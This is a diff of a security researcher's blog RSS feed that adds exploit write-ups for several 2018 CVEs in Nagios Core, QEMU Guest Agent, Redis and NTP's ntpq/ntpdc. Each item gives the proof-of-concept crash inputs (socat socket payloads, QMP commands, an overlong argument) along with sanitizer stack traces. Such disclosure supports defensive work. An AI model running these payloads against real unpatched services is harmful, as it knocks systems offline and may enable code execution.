+CVE : CVE-2018-13457&lt;br /&gt;
+&lt;br /&gt;
+qh_echo in Nagios Core 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attackers to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;br /&gt;
+&lt;br /&gt;
+$ echo -ne “#echo\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
+$ echo -ne “@echo\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
+&lt;br /&gt;
+#0 0x4cb18b in __interceptor_strcmp.part.60 /home/user/llvm/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:422&lt;br /&gt;
+#1 0x554e98 in qh_echo /home/user/nagioscore/base/query-handler.c:29:7&lt;br /&gt;
+#2 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12&lt;br /&gt;
+#3 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4&lt;br /&gt;
+#4 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12&lt;br /&gt;
+#5 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4&lt;br /&gt;
+#6 0x7f183c5f782f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
+#7 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
 </description>
-        <pubDate>Fri, 20 Mar 2015 00:00:00 +0800</pubDate>
-        <link>https://heiswayi.github.io/thinkspace/2015/what-is-lorem-ipsum/</link>
-        <guid isPermaLink="true">https://heiswayi.github.io/thinkspace/2015/what-is-lorem-ipsum/</guid>
+        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13457/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13457/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Cve 2018 13441</title>
+        <description>&lt;p&gt;Exploit Title: Nagios Core qh_help Denial of Service&lt;br /&gt;
+Date: 2018-07-09&lt;br /&gt;
+Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
+Vendor Homepage: https://www.nagios.org/&lt;br /&gt;
+Software Link: https://www.nagios.org/downloads/nagios-core/&lt;br /&gt;
+Version: 4.4.1 and earlier&lt;br /&gt;
+Tested on: 4.4.1&lt;br /&gt;
+CVE : CVE-2018-13441&lt;br /&gt;
+&lt;br /&gt;
+qh_help in Nagios Core version 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attacker to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;br /&gt;
+&lt;br /&gt;
+$ echo -ne “#help\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
+$ echo -ne “@help\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
+&lt;br /&gt;
+#0 0x554fef in qh_help /home/user/nagioscore/base/query-handler.c:374:7&lt;br /&gt;
+#1 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12&lt;br /&gt;
+#2 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4&lt;br /&gt;
+#3 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12&lt;br /&gt;
+#4 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4&lt;br /&gt;
+#5 0x7f61587ae82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
+#6 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13441/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13441/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Cve 2018 12617</title>
+        <description>&lt;p&gt;Exploit Title: QEMU Guest Agent Denial of Service&lt;br /&gt;
+Date: 2018-06-07&lt;br /&gt;
+Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
+Vendor Homepage: https://www.qemu.org/&lt;br /&gt;
+Software Link: https://www.qemu.org/download/&lt;br /&gt;
+Version: 2.12.50 and earlier&lt;br /&gt;
+Tested on: 2.12.50&lt;br /&gt;
+CVE : CVE-2018-12617&lt;br /&gt;
+&lt;br /&gt;
+QEMU Guest Agent 2.12.50 and earlier has an integer overflow causing a g_malloc0() call to trigger a segfault() call when trying to allocate a large memory chunk. The vulnerability can be exploited by sending a specific QMP command to the agent via the listening socket.&lt;br /&gt;
+&lt;br /&gt;
+1st, execute the guest-agent using the following command:&lt;br /&gt;
+&lt;br /&gt;
+$ qemu-ga -m unix-listen -p /tmp/qga.sock -t /tmp&lt;br /&gt;
+&lt;br /&gt;
+2nd, on the other console, connect to the UNIX socket using socat:&lt;br /&gt;
+&lt;br /&gt;
+$ socat unix-connect:/tmp/qga.sock -&lt;br /&gt;
+&lt;br /&gt;
+3rd, enter the following QMP command:&lt;br /&gt;
+&lt;br /&gt;
+{“execute”:”guest-file-open”, “arguments”:{“path”:”/tmp/poc”,”mode”:”w+”}}&lt;br /&gt;
+{“return”: 1000}&lt;br /&gt;
+{“execute”:”guest-file-read”, “arguments”:{“handle”:1000,”count”:4294967295}}&lt;br /&gt;
+&lt;br /&gt;
+The guest-file-read must be specified with the correct handle value (file descriptor). Different files will have different handle value.&lt;br /&gt;
+&lt;br /&gt;
+#0 0x5598eed0a1af in calloc /home/user/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:107&lt;br /&gt;
+#1 0x7f2ce5d7d770 in g_malloc0 (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4f770)&lt;br /&gt;
+#2 0x5598eed84996 in qmp_marshal_guest_file_read /home/user/qemu/qga/qapi-generated/qga-qapi-commands.c:425:14&lt;br /&gt;
+#3 0x5598eeda4fcf in do_qmp_dispatch /home/user/qemu/qapi/qmp-dispatch.c:119:5&lt;br /&gt;
+#4 0x5598eeda4fcf in qmp_dispatch /home/user/qemu/qapi/qmp-dispatch.c:168&lt;br /&gt;
+#5 0x5598eed59bff in process_command /home/user/qemu/qga/main.c:589:11&lt;br /&gt;
+#6 0x5598eed59bff in process_event /home/user/qemu/qga/main.c:626&lt;br /&gt;
+#7 0x5598eedb5f13 in json_message_process_token /home/user/qemu/qobject/json-streamer.c:105:5&lt;br /&gt;
+#8 0x5598eee25d9b in json_lexer_feed_char /home/user/qemu/qobject/json-lexer.c:323:13&lt;br /&gt;
+#9 0x5598eee25333 in json_lexer_feed /home/user/qemu/qobject/json-lexer.c:373:15&lt;br /&gt;
+#10 0x5598eed5a95e in channel_event_cb /home/user/qemu/qga/main.c:659:9&lt;br /&gt;
+#11 0x5598eed710c1 in ga_channel_client_event /home/user/qemu/qga/channel-posix.c:92:23&lt;br /&gt;
+#12 0x7f2ce5d78049 in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a049)&lt;br /&gt;
+&lt;br /&gt;
+References:&lt;br /&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;https://lists.gnu.org/archive/html/qemu-devel/2018-06/msg03385.html&lt;br /&gt;
+&lt;br /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-12617/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-12617/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Cve 2018 12453</title>
+        <description>&lt;p&gt;Exploit Title: Redis 5.0 Denial of Service&lt;br /&gt;
+Date: 2018-06-13&lt;br /&gt;
+Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
+Vendor Homepage: https://redis.io/&lt;br /&gt;
+Software Link: https://redis.io/download&lt;br /&gt;
+Version: 5.0&lt;br /&gt;
+Fixed on: 5.0&lt;br /&gt;
+CVE : CVE-2018-12453&lt;br /&gt;
+&lt;br /&gt;
+Type confusion in the xgroupCommand function in t_stream.c in redis-server in Redis before 5.0 allows remote attackers to cause denial-of-service via an XGROUP command in which the key is not a stream.&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+@@ -1576,7 +1576,7 @@ NULL&lt;br /&gt;
+    	/* Lookup the key now, this is common for all the subcommands but HELP. */&lt;br /&gt;
+    	if (c-&amp;gt;argc &amp;gt;= 4) {&lt;br /&gt;
+		robj *o = lookupKeyWriteOrReply(c,c-&amp;gt;argv[2],shared.nokeyerr);&lt;br /&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;if (o == NULL) return;&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;if (o == NULL || checkType(c,o,OBJ_STREAM)) return;&lt;br /&gt;
+        	s = o-&amp;gt;ptr;&lt;br /&gt;
+        	grpname = c-&amp;gt;argv[3]-&amp;gt;ptr;&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+#0 0x6d0706 in logStackContent /home/user/redis/src/debug.c:732:45&lt;br /&gt;
+#1 0x6d3917 in sigsegvHandler /home/user/redis/src/debug.c:1089:5&lt;br /&gt;
+#2 0x7f65d736e38f  (/lib/x86_64-linux-gnu/libpthread.so.0+0x1138f)&lt;br /&gt;
+#3 0x804afc in streamLookupCG /home/user/redis/src/t_stream.c:1502:12&lt;br /&gt;
+#4 0x805b36 in xgroupCommand /home/user/redis/src/t_stream.c:1584:19&lt;br /&gt;
+#5 0x58ded7 in call /home/user/redis/src/server.c:2298:5&lt;br /&gt;
+#6 0x591c70 in processCommand /home/user/redis/src/server.c:2580:9&lt;br /&gt;
+#7 0x5e2d98 in processInputBuffer /home/user/redis/src/networking.c:1325:17&lt;br /&gt;
+#8 0x565612 in aeProcessEvents /home/user/redis/src/ae.c:443:17&lt;br /&gt;
+#9 0x56614c in aeMain /home/user/redis/src/ae.c:501:9&lt;br /&gt;
+#10 0x59da71 in main /home/user/redis/src/server.c:3992:5&lt;br /&gt;
+#11 0x7f65d6d9d82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
+#12 0x43da38 in _start (/home/user/redis/src/redis-server+0x43da38)&lt;br /&gt;
+&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-12453/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-12453/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Cve 2018 12327</title>
+        <description>&lt;p&gt;Exploit Title: ntpq and ntpdc 4.2.8p11 Local Buffer Overflow&lt;br /&gt;
+Date: 2018-06-06&lt;br /&gt;
+Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
+Vendor Homepage: http://www.ntp.org/&lt;br /&gt;
+Software Link: http://www.ntp.org/downloads.html&lt;br /&gt;
+Version: 4.2.8p11 and earlier&lt;br /&gt;
+Tested on: 4.2.8p11&lt;br /&gt;
+CVE : CVE-2018-12327&lt;br /&gt;
+&lt;br /&gt;
+Stack-based buffer overflow in ntpq and ntpdc of NTP version 4.2.8p11 allows a local attacker to achieve code execution or escalate to higher privileges via a long string as the argument for an IPv4 or IPv6 command-line parameter.&lt;br /&gt;
+&lt;br /&gt;
+$ ./ntpq -4 [&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'print &quot;A&quot; * 300’&lt;/code&gt;]&lt;br /&gt;
+&lt;br /&gt;
+#0 0x562fcada86ce in openhost /home/user/ntp-4.2.8p11/ntpq/ntpq.c:655:12&lt;br /&gt;
+#1 0x562fcada5f2a in ntpqmain /home/user/ntp-4.2.8p11/ntpq/ntpq.c:606:10&lt;br /&gt;
+#2 0x562fcada4729 in main /home/user/ntp-4.2.8p11/ntpq/ntpq.c:469:9&lt;br /&gt;
+#3 0x7f79b684982f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
+#4 0x562fcac96d88 in _start (/home/user/ntp-4.2.8p11/ntpq/ntpq+0xacd88)&lt;br /&gt;
+&lt;br /&gt;
+$ ./ntpdc -4 [&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'print &quot;A&quot; * 300'&lt;/code&gt;]&lt;br /&gt;
+&lt;br /&gt;
+#0 0x55f726641efe in openhost /home/user/ntp-4.2.8p11/ntpdc/ntpdc.c:413:12&lt;br /&gt;
+#1 0x55f7266400d4 in ntpdcmain /home/user/ntp-4.2.8p11/ntpdc/ntpdc.c:365:10&lt;br /&gt;
+#2 0x55f72663f269 in main /home/user/ntp-4.2.8p11/ntpdc/ntpdc.c:255:9&lt;br /&gt;
+#3 0x7f0fc632382f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
+#4 0x55f7265362d8 in _start (/home/user/ntp-4.2.8p11/ntpdc/ntpdc+0x9d2d8)&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-12327/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-12327/</guid>
         
         
       </item>
